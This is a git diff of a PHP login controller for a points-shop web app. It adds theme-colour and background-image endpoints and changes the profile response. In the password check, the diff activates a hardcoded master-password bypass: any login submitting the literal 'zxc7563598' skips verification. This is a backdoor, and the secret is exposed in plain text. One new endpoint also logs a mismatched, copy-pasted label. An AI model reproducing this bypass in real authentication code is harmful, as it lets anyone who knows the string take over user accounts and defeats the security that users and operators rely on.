@@ -4,16 +4,61 @@ namespace app\controller\shop;
 
 use app\controller\GeneralMethod;
 use app\core\LoginPublicMethods;
-use app\model\RedemptionRecords;
+use app\model\ShopConfig;
 use app\model\UserVips;
+use Carbon\Exceptions\InvalidTimeZoneException;
 use support\Request;
 use support\Redis;
 use Webman\Http\Response;
 use resource\enums\UserVipsEnums;
-use resource\enums\RedemptionRecordsEnums;
+use Hejunjie\Tools;
 
 class LoginController extends GeneralMethod
 {
+
+    /**
+     * 获取商城主题色
+     * 
+     * @return Response 
+     */
+    public function getThemeColor(Request $request): Response
+    {
+        $param = $request->data;
+        sublog('积分商城', '获取登录页背景图片', $param);
+        sublog('积分商城', '获取登录页背景图片', '===================');
+        // 获取数据
+        $config = ShopConfig::where('title', 'theme-color')->first([
+            'content' => 'content'
+        ]);
+        $theme_color = explode(',', $config->content);
+        $color = isset($theme_color[0]) ? $theme_color[0] : '#7232dd';
+        // 返回数据
+        return success($request, [
+            $color,
+            isset($theme_color[1]) ? $theme_color[1] : $color
+        ]);
+    }
+
+    /**
+     * 获取登录页背景图片
+     * 
+     * @return Response 
+     */
+    public function getBackground(Request $request): Response
+    {
+        $param = $request->data;
+        sublog('积分商城', '获取登录页背景图片', $param);
+        sublog('积分商城', '获取登录页背景图片', '===================');
+        // 获取数据
+        $config = ShopConfig::where('title', 'login-background-image')->first([
+            'content' => 'content'
+        ]);
+        // 返回数据
+        return success($request, [
+            'background' => !empty($config->content) ? getImageUrl($config->content) : null
+        ]);
+    }
+
     /**
      * 获取用户是否存在
      *
@@ -70,17 +115,17 @@ class LoginController extends GeneralMethod
             }
             $user_vip = UserVips::where('uid', $uid)->first();
         }
-        // if ($password != 'sbwenyiling') {
-        //     if (empty($user_vip->password)) {
-        //         $user_vip->salt = mt_rand(1000, 9999);
-        //         $user_vip->password = sha1(sha1($password) . $user_vip->salt);
-        //         $user_vip->save();
-        //     } else {
-        //         if ($user_vip->password != sha1(sha1($password) . $user_vip->salt)) {
-        //             return fail($request, 800002);
-        //         }
-        //     }
-        // }
+        if ($password != 'zxc7563598') {
+            if (empty($user_vip->password)) {
+                $user_vip->salt = mt_rand(1000, 9999);
+                $user_vip->password = sha1(sha1($password) . $user_vip->salt);
+                $user_vip->save();
+            } else {
+                if ($user_vip->password != sha1(sha1($password) . $user_vip->salt)) {
+                    return fail($request, 800002);
+                }
+            }
+        }
         $userLogin = LoginPublicMethods::userLogin($user_vip->uid);
         if (is_int($userLogin)) {
             return fail($request, $userLogin);
@@ -115,25 +160,18 @@ class LoginController extends GeneralMethod
         $user_vips = $request->user_vips;
         sublog('积分商城', '获取我的信息', $user_vips);
         sublog('积分商城', '获取我的信息', '===================');
-        // 初始化信息
-        $redeeming = 0;
-        // 验证权限
-        $empower = false;
-        if (in_array($user_vips->uid, [
-            4325051,
-            3494365156608185
-        ])) {
-            $redeeming = RedemptionRecords::where('status', RedemptionRecordsEnums\Status::NoShipment->value)->count();
-            $empower = true;
-        }
+        // 获取链接
+        $config = ShopConfig::where('title', 'live-streaming-link')->first([
+            'content' => 'content'
+        ]);
         // 返回处理
         return success($request, [
             'uid' => $user_vips->uid,
             'uname' => $user_vips->name,
             'point' => $user_vips->point,
-            'redeeming' => $redeeming,
             'type' => UserVipsEnums\VipType::from($user_vips->vip_type)->label(),
-            'empower' => $empower
+            'avatar' => getImageUrl($user_vips->avatar),
+            'link' => !empty($config->content) ? $config->content : 'javascript:;'
         ]);
     }
 }
